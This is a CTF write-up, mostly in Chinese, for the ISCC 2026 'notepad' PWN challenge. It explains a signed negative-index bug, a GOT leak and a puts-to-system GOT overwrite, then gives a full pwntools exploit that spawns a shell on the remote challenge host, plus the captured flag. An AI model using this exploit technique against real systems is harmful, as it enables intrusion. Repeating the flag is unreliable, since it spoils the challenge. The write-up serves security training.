# notepad

> **Category**: PWN | **Difficulty**: Medium | **Competition**: ISCC 2026 区域赛
> **Flag**: `ISCC{d2a0be8b-0098-42fc-941d-2a129c2911f9}`

---

## Attack Chain

```
No RELRO → 负数索引越界读写 → 泄露printf@GOT → 覆写puts@GOT为system → system("/bin/sh")
```

## Key Techniques

### 1. 文件保护机制分析

```
Arch:     amd64-64-little
RELRO:    No RELRO      ← GOT完全可写！
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```

关键发现：**No RELRO**，GOT 表条目可被任意覆写。

### 2. 程序功能逆向

程序是简易记事本，提供 `Create Note` 和 `View Note` 两个功能。

**`get_note()` — 核心漏洞所在：**

```c
void* get_note() {
    int index;
    printf("Index: ");
    scanf("%d", &index);
    if (index > 9) {       // ← 有符号比较！负数可以通过
        printf("Index out of range!");
        exit(-1);
    }
    return &notes + index * 0x30;  // ← movsxd 符号扩展
}
```

- 边界检查用 `jle`（有符号跳转），负数如 -4 满足 `-4 <= 9`
- `movsxd` 将 32 位负数符号扩展为 64 位负数
- `notes[]` 全局数组位于 PIE 偏移 `0x35A0`，每条笔记 `0x30` 字节（title 0x10 + content 0x20）

### 3. GOT 表布局

```
0x34D0:  puts@GOT              ← 覆写目标
0x34D8:  __stack_chk_fail@GOT
0x34E0:  printf@GOT             ← notes[-4].title 指向这里
0x34E8:  alarm@GOT
0x34F0:  read@GOT               ← notes[-4].content 指向这里
...
0x35A0:  notes[] 数组起始
```

### 4. 攻击四步

1. `create_note(0)`：title 写入 `"/bin/sh\x00"`
2. `view_note(-4)`：泄露 printf 和 read 的 libc 地址
3. `create_note(-5)`：覆写 `puts@GOT` 为 `system`
4. `view_note(0)`：触发 `puts("/bin/sh")` → `system("/bin/sh")`

### 5. libc 版本识别

附件提供的 libc 与远端不匹配（printf 低 12 位：附件 `0xe10` vs 远端 `0xc90`）。通过 libc.rip 用泄露的低 12 位查询，确认远端使用 `libc6_2.31-0ubuntu9.16_amd64`。

正确的偏移：printf = `0x61c90`，system = `0x52290`。

## Exploit

```python
from pwn import *
import time

context.arch = 'amd64'
context.log_level = 'info'

# 远端 libc 偏移 (libc6_2.31-0ubuntu9.16_amd64)
PRINTF_OFFSET = 0x61c90
READ_OFFSET   = 0x10e1e0
SYSTEM_OFFSET = 0x52290

p = remote('39.96.193.120', 10005)

def recv_until(delim, timeout=5):
    data = b''
    deadline = time.time() + timeout
    while delim not in data and time.time() < deadline:
        try:
            data += p.recv(timeout=max(0.5, deadline - time.time()))
        except:
            break
    return data

# Step 1: 创建 note 0，title = "/bin/sh"
recv_until(b'> ')
p.sendline(b'1')
recv_until(b'Index:')
p.sendline(b'0')
recv_until(b'Name:')
p.send(b'/bin/sh\x00')
recv_until(b'Content:')
p.send(b'placeholder')

# Step 2: 泄露 libc
recv_until(b'> ')
p.sendline(b'2')
recv_until(b'Index:')
p.sendline(b'-4')

time.sleep(2)
data = b''
while b'> ' not in data:
    try:
        data += p.recv(timeout=3)
    except:
        break

idx_name = data.find(b'Name: ')
idx_content = data.find(b'Content: ')

leak1 = data[idx_name+6:idx_content].split(b'\n')[0]
printf_addr = u64(leak1.ljust(8, b'\x00'))

leak2 = data[idx_content+9:].split(b'\n')[0]
read_addr = u64(leak2.ljust(8, b'\x00'))

libc_base = printf_addr - PRINTF_OFFSET
system_addr = libc_base + SYSTEM_OFFSET

log.success(f"libc base: {hex(libc_base)}")
log.success(f"system:    {hex(system_addr)}")

# Step 3: 覆写 puts@GOT = system
payload = b'\x00' * 16 + p64(system_addr) + b'\x00' * 8

p.sendline(b'1')
recv_until(b'Index:')
p.sendline(b'-5')
recv_until(b'Name:')
p.send(b'A' * 16)
recv_until(b'Content:')
p.send(payload)

# Step 4: 触发 system("/bin/sh")
time.sleep(1)
p.sendline(b'2')
recv_until(b'Index:')
p.sendline(b'0')

p.interactive()
```

**运行结果：**

```
[*] Opening connection to 39.96.193.120 on port 10005
[+] Opening connection to 39.96.193.120 on port 10005: Done
[+] libc base @ 0x7f1c4e354000
[*] Step 3: Overwriting puts@GOT with system...
[*] Step 4: Triggering shell...

Name: ISCC{d2a0be8b-0098-42fc-941d-2a129c2911f9}
```

## Distilled Knowledge

| 知识点 | 关键 |
|--------|------|
| No RELRO | GOT表完全可写，允许覆写 |
| 有符号边界检查 | `jle` 不拒绝负数，`movsxd`符号扩展 |
| GOT覆写 | 泄露libc → 计算system → 覆写GOT |
| libc版本识别 | 低12位不变，用libc.rip查询 |
| PIE偏移计算 | notes数组与GOT的相对偏移决定索引 |

---

*Original writeup: `C:\Users\48714\Desktop\wp\区域赛\notepad_WriteUp_final.md`*
